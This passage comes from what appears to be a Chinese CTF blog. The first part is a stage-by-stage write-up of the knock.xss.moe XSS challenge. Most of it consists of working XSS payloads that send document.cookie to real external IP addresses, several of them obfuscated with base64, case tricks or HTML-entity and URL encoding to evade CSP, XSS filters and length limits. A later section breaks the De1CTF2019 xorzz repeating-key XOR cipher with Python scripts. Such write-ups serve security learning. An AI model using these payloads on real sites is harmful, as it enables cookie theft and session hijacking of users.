<h2 id="stage-12"><a href="#stage-12" class="headerlink" title="stage 12"></a>stage 12</h2><blockquote>
<p>CSP contains ‘unsafe-inline’</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:var xss=document.createlement(`link`);xss.setAttribute(`rel`,`prefetch`);xss.setAttribute(`href`,`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`);document.head.appendChild(xss);</span><br><span class="line">//页面渲染完毕会创建 Link REL=prefetch 的标签，向目标页面发起预加载</span><br></pre></td></tr></table></figure>

<h2 id="stage-13"><a href="#stage-13" class="headerlink" title="stage 13"></a>stage 13</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q= &lt;svg onload=eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249YGh0dHA6Ly8yMDcuMTQ4LjY0LjEyNDoxMjM0Lz8ke2RvY3VtZW50LmNvb2tpZX1g&apos;))&gt;</span><br><span class="line">//base64.b64encode(&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&apos;)</span><br></pre></td></tr></table></figure>

<h2 id="stage-14"><a href="#stage-14" class="headerlink" title="stage 14"></a>stage 14</h2><blockquote>
<p>CSP:frame-src http://*.knock.xss.moe</p>
</blockquote>
<p>using other stage to get the flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=document.domain=`knock.xss.moe`;window.open(`http://207.148.64:1234/?$&#123;parent.document.cookie&#125;`)</span><br><span class="line"></span><br><span class="line">//attention to &apos;domain=`knock.xss.moe`&apos; and &apos;parent.document.cookie&apos;</span><br></pre></td></tr></table></figure>

<h2 id="stage-15"><a href="#stage-15" class="headerlink" title="stage 15"></a>stage 15</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg onload=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-16-amp-17"><a href="#stage-16-amp-17" class="headerlink" title="stage 16 &amp; 17"></a>stage 16 &amp; 17</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;parent.document.cookie&#125;`</span><br></pre></td></tr></table></figure>

<h2 id="stage-18"><a href="#stage-18" class="headerlink" title="stage 18"></a>stage 18</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`)//</span><br><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?`%2bdocument.cookie)//</span><br></pre></td></tr></table></figure>

<h2 id="stage-19"><a href="#stage-19" class="headerlink" title="stage 19"></a>stage 19</h2><blockquote>
<p>you can eval function in alert()</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xxs&apos;,window.open(`http://207.148.74.125:1234/?$&#123;document.cookie&#125;`));//</span><br></pre></td></tr></table></figure>

<h2 id="stage-20"><a href="#stage-20" class="headerlink" title="stage 20"></a>stage 20</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;scrscriptipt&gt;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-21"><a href="#stage-21" class="headerlink" title="stage 21"></a>stage 21</h2><blockquote>
<p>x-xss-protection:1;mode=block;,这里使用了XSS过滤，如果检测到攻击，就会浏览器会阻止页面渲染</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;sCript&gt;docuscriptment.locscriptation=`http://url/?$&#123;document.cookie&#125;`&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-22"><a href="#stage-22" class="headerlink" title="stage 22"></a>stage 22</h2><blockquote>
<p>length limit: consider <svg> first,and replace http:// to //,and convert ip to desimalism</svg></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg/onload=window.open(`//url(desimalism)/?$&#123;document.cookie&#125;`)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-23-amp-24"><a href="#stage-23-amp-24" class="headerlink" title="stage 23 &amp; 24"></a>stage 23 &amp; 24</h2><blockquote>
<p>location.hash:get the anchor point(the content after ‘#’) , which can be used to bypass the length limit</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`//url/?$&#123;document.cookie&#125;`)</span><br></pre></td></tr></table></figure>

<h2 id="stage-25"><a href="#stage-25" class="headerlink" title="stage 25"></a>stage 25</h2><p>this is extremely short….</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the index.php on my vps :</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.name=&quot;location.href=`url/?$&#123;parent.document.cookie&#125;`&quot;;</span><br><span class="line">location.href = &quot;http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=&lt;svg/onload=eval(window.name)&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">and followed by :</span><br><span class="line">http://2017.148.64.125/index.php</span><br></pre></td></tr></table></figure>

<h2 id="stage-26"><a href="#stage-26" class="headerlink" title="stage 26"></a>stage 26</h2><p>会把输入字符全部大写化，原先的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=window.open(`http://134.175.33.164:1234/?$&#123;document.cookie&#125;`)&gt;</span><br></pre></td></tr></table></figure>

<p>将其进行html实体编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6f;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x28;&amp;#x60;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x33;&amp;#x34;&amp;#x2e;&amp;#x31;&amp;#x37;&amp;#x35;&amp;#x2e;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#x34;&amp;#x3a;&amp;#x31;&amp;#x32;&amp;#x33;&amp;#x34;&amp;#x2f;&amp;#x3f;&amp;#x24;&amp;#x7b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x7d;&amp;#x60;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>

<p>为了防止井号被当作是锚点，将其进行urlencode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=%26%23%78%37%37%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%37%37%3b%26%23%78%32%65%3b%26%23%78%36%66%3b%26%23%78%37%30%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%32%38%3b%26%23%78%36%30%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%33%61%3b%26%23%78%32%66%3b%26%23%78%32%66%3b%26%23%78%33%31%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%37%3b%26%23%78%33%35%3b%26%23%78%32%65%3b%26%23%78%33%33%3b%26%23%78%33%33%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%36%3b%26%23%78%33%34%3b%26%23%78%33%61%3b%26%23%78%33%31%3b%26%23%78%33%32%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%66%3b%26%23%78%33%66%3b%26%23%78%32%34%3b%26%23%78%37%62%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%33%3b%26%23%78%36%66%3b%26%23%78%36%66%3b%26%23%78%36%62%3b%26%23%78%36%39%3b%26%23%78%36%35%3b%26%23%78%37%64%3b%26%23%78%36%30%3b%26%23%78%32%39%3b&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>crypto</title>
    <url>/2019/04/22/crypto/</url>
    <content><![CDATA[<h2 id="De1ctf2019-xorzz"><a href="#De1ctf2019-xorzz" class="headerlink" title="De1ctf2019 xorzz"></a>De1ctf2019 xorzz</h2><p>源码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  from data import flag,plain</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">"dd"</span></span><br><span class="line">flag = <span class="string">"de1ctf&#123;testflag&#125;"</span></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key)&lt;<span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line"></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure>

<p>首先将密文中的盐分去掉。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output=<span class="string">'49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c'</span></span><br><span class="line"></span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line"></span><br><span class="line">sa = cycle(salt)</span><br><span class="line">out = output.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    res += chr(ord(i) ^ ord(next(sa)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#  print b64encode(res.encode('hex'))</span></span><br><span class="line"><span class="keyword">print</span> b64encode(res)</span><br></pre></td></tr></table></figure>

<p>去掉盐分之后，问题就变成了汉明文密码。原理见博客<a href="https://www.anquanke.com/post/id/161171#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161171#h2-0</a><br>这里直接上脚本了。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"></span><br><span class="line">CHARACTER_FREQ = &#123;</span><br><span class="line">    <span class="string">'a'</span>: <span class="number">0.0651738</span>, <span class="string">'b'</span>: <span class="number">0.0124248</span>, <span class="string">'c'</span>: <span class="number">0.0217339</span>, <span class="string">'d'</span>: <span class="number">0.0349835</span>, <span class="string">'e'</span>: <span class="number">0.1041442</span>, <span class="string">'f'</span>: <span class="number">0.0197881</span>, <span class="string">'g'</span>: <span class="number">0.0158610</span>,</span><br><span class="line">    <span class="string">'h'</span>: <span class="number">0.0492888</span>, <span class="string">'i'</span>: <span class="number">0.0558094</span>, <span class="string">'j'</span>: <span class="number">0.0009033</span>, <span class="string">'k'</span>: <span class="number">0.0050529</span>, <span class="string">'l'</span>: <span class="number">0.0331490</span>, <span class="string">'m'</span>: <span class="number">0.0202124</span>, <span class="string">'n'</span>: <span class="number">0.0564513</span>,</span><br><span class="line">    <span class="string">'o'</span>: <span class="number">0.0596302</span>, <span class="string">'p'</span>: <span class="number">0.0137645</span>, <span class="string">'q'</span>: <span class="number">0.0008606</span>, <span class="string">'r'</span>: <span class="number">0.0497563</span>, <span class="string">'s'</span>: <span class="number">0.0515760</span>, <span class="string">'t'</span>: <span class="number">0.0729357</span>, <span class="string">'u'</span>: <span class="number">0.0225134</span>,</span><br><span class="line">    <span class="string">'v'</span>: <span class="number">0.0082903</span>, <span class="string">'w'</span>: <span class="number">0.0171272</span>, <span class="string">'x'</span>: <span class="number">0.0013692</span>, <span class="string">'y'</span>: <span class="number">0.0145984</span>, <span class="string">'z'</span>: <span class="number">0.0007836</span>, <span class="string">' '</span>: <span class="number">0.1918182</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_repeat_key</span><span class="params">(key,string)</span>:</span></span><br><span class="line">	key_len=len(key)</span><br><span class="line">	result=<span class="string">''</span></span><br><span class="line">	str_result=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> index,ch <span class="keyword">in</span> enumerate(string):</span><br><span class="line">		n=index%key_len</span><br><span class="line">		b=chr(ord(key[n])^ord(ch))</span><br><span class="line">		str_result+=b</span><br><span class="line">	<span class="keyword">return</span> str_result</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得概率分数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score</span><span class="params">(string)</span>:</span></span><br><span class="line">	score=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">		char=char.lower()</span><br><span class="line">		<span class="keyword">if</span> char <span class="keyword">in</span> CHARACTER_FREQ:</span><br><span class="line">			score+=CHARACTER_FREQ[char]</span><br><span class="line">	<span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将hex的每个字符与备选密钥进行xor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_xor</span><span class="params">(candidate_key,hex_string)</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> hex_string:</span><br><span class="line">		b=chr(candidate_key^ord(i))</span><br><span class="line">		result+=b</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历备选密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Traversal_singlechar</span><span class="params">(hex_string)</span>:</span></span><br><span class="line">	candidate=[]</span><br><span class="line">	<span class="keyword">for</span> candidate_key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		plaintext=single_xor(candidate_key,hex_string)</span><br><span class="line">		score=get_score(plaintext)</span><br><span class="line">		result=&#123;</span><br><span class="line">		<span class="string">'score'</span>:score,</span><br><span class="line">		<span class="string">'plaintext'</span>:plaintext,</span><br><span class="line">		<span class="string">'key'</span>:candidate_key</span><br><span class="line">		&#125;</span><br><span class="line">		candidate.append(result)</span><br><span class="line">	<span class="keyword">return</span> sorted(candidate,key=<span class="keyword">lambda</span> c:c[<span class="string">'score'</span>])[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(a_str,b_str)</span>:</span></span><br><span class="line">	dist=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a_str,b_str):</span><br><span class="line">		b=bin(ord(x)^ord(y)) <span class="comment">#转换为二进制（以字符串形式表示，如“0b100000”，0b表示二进制）</span></span><br><span class="line">		dist+=b.count(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">return</span> dist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_keysize</span><span class="params">(string)</span>:</span></span><br><span class="line">	normals=[]</span><br><span class="line">	<span class="keyword">for</span> keysize <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">40</span>):</span><br><span class="line">		blocks=[]</span><br><span class="line">		cnt=<span class="number">0</span></span><br><span class="line">		distance=<span class="number">0</span></span><br><span class="line">		<span class="comment">#根据建议获得四个block，将这四个block两两得到hamming_distance。</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(string),keysize):</span><br><span class="line">			cnt+=<span class="number">1</span></span><br><span class="line">			blocks.append(string[i:i+keysize])</span><br><span class="line">			<span class="keyword">if</span> cnt==<span class="number">4</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		pairs=itertools.combinations(blocks,<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> (x,y) <span class="keyword">in</span> pairs:</span><br><span class="line">			distance+=hamming_distance(x,y)</span><br><span class="line">		<span class="comment">#平均一下</span></span><br><span class="line">		distance=distance/(<span class="number">6.0</span>)</span><br><span class="line">		<span class="comment">#Normalize this result by dividing by KEYSIZE.</span></span><br><span class="line">		normal_distance=distance/keysize</span><br><span class="line">		key=&#123;</span><br><span class="line">		<span class="string">'keysize'</span>:keysize,</span><br><span class="line">		<span class="string">'distance'</span>:normal_distance</span><br><span class="line">		&#125;</span><br><span class="line">		normals.append(key)</span><br><span class="line">		<span class="comment">#print key</span></span><br><span class="line">	<span class="comment">#选3个最小的为待选的keysize</span></span><br><span class="line">	candidate_keysize=sorted(normals,key=<span class="keyword">lambda</span> c:c[<span class="string">'distance'</span>])[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">	<span class="keyword">return</span> candidate_keysize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_key</span><span class="params">(keysize,string)</span>:</span></span><br><span class="line">	now_str=<span class="string">''</span></span><br><span class="line">	key=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(keysize):</span><br><span class="line">		now_str=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> index,ch <span class="keyword">in</span> enumerate(string):</span><br><span class="line">			<span class="keyword">if</span> index%keysize==i:</span><br><span class="line">				now_str+=ch</span><br><span class="line">		<span class="comment">#获得key的第i位的值,转换为字符</span></span><br><span class="line">		<span class="comment">#print now_str</span></span><br><span class="line">		key+=chr(Traversal_singlechar(now_str)[<span class="string">'key'</span>])</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plaint</span><span class="params">(string)</span>:</span></span><br><span class="line">	keysize_list=guess_keysize(string)</span><br><span class="line">	candidate_key=[]</span><br><span class="line">	possible_plaints=[]</span><br><span class="line">	<span class="keyword">for</span> keysize <span class="keyword">in</span> keysize_list:</span><br><span class="line">		key=guess_key(keysize[<span class="string">'keysize'</span>],string)</span><br><span class="line">		<span class="comment">#print key</span></span><br><span class="line">		possible_plaints.append((xor_repeat_key(key,string),key))</span><br><span class="line"></span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	for i in possible_plaints:</span></span><br><span class="line"><span class="string">		print i[1]</span></span><br><span class="line"><span class="string">		print get_score(i[0].decode('hex'))</span></span><br><span class="line"><span class="string">		print len(i[0])</span></span><br><span class="line"><span class="string">		print i[0].decode('hex')</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> sorted(possible_plaints,key=<span class="keyword">lambda</span> c:get_score(c[<span class="number">0</span>]))[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">assert</span> hamming_distance(<span class="string">'this is a test'</span>, <span class="string">'wokka wokka!!!'</span>) == <span class="number">37</span></span><br><span class="line">	contents=open(<span class="string">'6.txt'</span>).read()</span><br><span class="line">	<span class="comment">#base64解码</span></span><br><span class="line">	string=str(contents).decode(<span class="string">'base64'</span>)</span><br><span class="line">	result=get_plaint(string)</span><br><span class="line">	<span class="keyword">print</span> result[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">print</span> result[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>

<p>6.txt中的内容是去盐分之后的密文base64之后的内容。</p>
<p>再附上hctf2018中天枢的脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span><span class="params">(a, b)</span>:</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(b1, b2)</span>:</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(<span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span><span class="params">(text)</span>:</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">'ascii'</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"6.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        text += line</span><br><span class="line"><span class="comment">#  b = base64.b64decode(text)</span></span><br><span class="line">    b = text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) + </span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), <span class="string">"utf-8"</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(<span class="string">"keysize:"</span>, KEYSIZE)</span><br><span class="line">        print(<span class="string">"key is:"</span>, keys, <span class="string">"n"</span>)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="PHP-encrypto-1"><a href="#PHP-encrypto-1" class="headerlink" title="PHP_encrypto_1"></a>PHP_encrypto_1</h3><p>source code:::</p>
